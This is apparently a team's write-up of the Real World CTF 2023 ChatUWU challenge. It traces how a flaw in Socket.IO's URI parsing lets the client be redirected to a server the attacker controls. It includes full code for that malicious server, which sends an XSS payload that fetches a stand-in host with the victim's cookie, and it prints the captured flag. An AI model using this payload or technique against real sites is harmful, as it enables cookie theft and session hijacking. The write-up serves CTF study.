[Real World CTF 2023](https://realworldctf.com/challenge) was a jeopardy-style capture-the-flag event.
We participated as part of the [Sauercloud](https://ctftime.org/team/54748) CTF-team.

## Overview
The Challenge description reads: "I can ensure you that there is no xss on the server! You will find the flag in the admin's cookie." Also provided are links to the Challenge and the XSS Bot as well as the source code - So immediatly our goal is clear: steal the cookies of the XSS Bot.

Lets take a look at the application:
+The Challenge is a simple node app with one static html file that is served and a single index.js for as the backend. The app is a simple chat app.

## Lets find a xss
Upon taking a look at the index.html we first see that is uses Socket.IO for the chat communication with the server and also quickly find this:
```js
socket.on('msg', function (msg) {
    let item = document.createElement('li'),
        msgtext = `... ${msg.text}`;
    room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext 
    ...
    messages.appendChild(item);
    ...
```

So any messages received via Socket.IO are inserted into the DOM without sanitization if the chat-room's name is `DOMPurify` and the message's `isHtml` field is `true`.
So lets try to send a message containing a xss-payload

![Screenshot escaped Message](/imgs/rwctf23-chatuwu-escaped-message.png)

Clearly that didn't work - so the server must have sanatized it before sending it back to all clients.

## The server code

Here we immediatly see why our simple attempt failed:
```js
io.to(room).emit('msg', {
    from: DOMPurify.sanitize(msg.from),
    text: DOMPurify.sanitize(msg.text),
    isHtml: true
});
```
Any message send to the clients is piped through DOMPurify - RIP simple XSS.

## A different approach 
Given the simplicity of the app we were pretty sure that the client side DOM inseration is our way of stealing the cookie. So maybe we can attack the connection by hijacking the Socket.IO connection.

Let's see how the client establishes the connection:
```js
let socket = io(`/${location.search}`) 
```

Interesting so the entrire query string is passed into Socket.IO for parsing - lets take a look how the parsing works. In the used `socket.io.js` we find this in the constructor:
```js
uri = parse(uri);
opts.hostname = uri.host
```
Looks promising. We can completly control `uri` except for the leading `/`, lets dig deeper - for `parse` we find this:
```js
  // imported from https://github.com/galkn/parseuri

  /**
   * Parses an URI
   *
   * @author Steven Levithan <stevenlevithan.com> (MIT license)
   * @api private
   */
  ...
  function parse(str) {...}
```

And in the repo we find this issue: https://github.com/galkn/parseuri/issues/12 - And it's still open! Sadly there are no details about the security issue - so we'll have to find it ourselves.

## The vulnerabillity
Let's take a look at the regex used for the parsing of `uri`:
```js
var re = /^(?:(?![^:@]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/;
```

The interesting part for us is that it checks for username/password as part of the uri and it does so by looking for any string infront of the first `@` in the passed uri, not just in the authority part. So if we append `@our.domain.invalid` to the end of `uri`, the parse function will treat everything between the protocol and the `@` as a username and `our.domain.invalid` as the hostname.
This is the vulnerabillity we need.

## The Exploit
Idea: We will host a malicious version of index.js ourselves with a key addition: a JS-payload that exfiltrates the cookie is sent instead of the normal join message, which is sent after a user joins to all users including the joining one.

Code:
```js
const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});
const DOMPurify = require('isomorphic-dompurify');

const hostname = process.env.HOSTNAME || '0.0.0.0';
const port = 80;
const rooms = ['textContent', 'DOMPurify'];


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
    let {nickname, room} = socket.handshake.query;
    socket.join(room);
    io.to(room).emit('msg', {
        from: 'system',
        text: "<img src onerror='fetch(\"https://our.domain.invalid/?\" + document.cookie)'>",
        isHtml: true
    });
});

http.listen(port, hostname, () => {
    console.log(`ChatUWU server running at http://${hostname}:${port}/`);
});
```

We get the Flag:
```
rwctf{1e542e65e8240f9d60ab41862778a1b408d97ac2}
```
